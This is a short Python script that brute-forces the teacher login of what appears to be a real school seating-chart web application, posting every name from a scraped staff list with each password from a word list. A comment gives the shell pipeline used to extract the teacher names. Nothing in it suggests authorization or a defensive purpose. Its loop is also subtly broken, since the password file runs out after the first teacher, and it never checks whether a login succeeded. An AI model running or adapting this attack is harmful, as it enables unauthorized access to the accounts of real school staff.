import requests
passwords = open("passwords.txt", "r")
teachers = open("teacher2.txt", "r")
url = "http://bert.stuy.edu/pbrooks/seating_chart/class_chart.py"
#cat teacher.txt | sed -e 's/<option value=\(.*\)>/\1/' |  cut -f1,2 -d'"' | cut -c 2-  > teacher2.txt
lastResponse = None
for teacher in teachers:
    for password in passwords:
        #if lastResponse:
        data = {"password": password, "staff":teacher.strip("\n"), "teacher-login":"Next"}
        r = requests.post(url = url, data = data) 

        response = r.text 
        print(teacher.strip("\n"), ":", password)

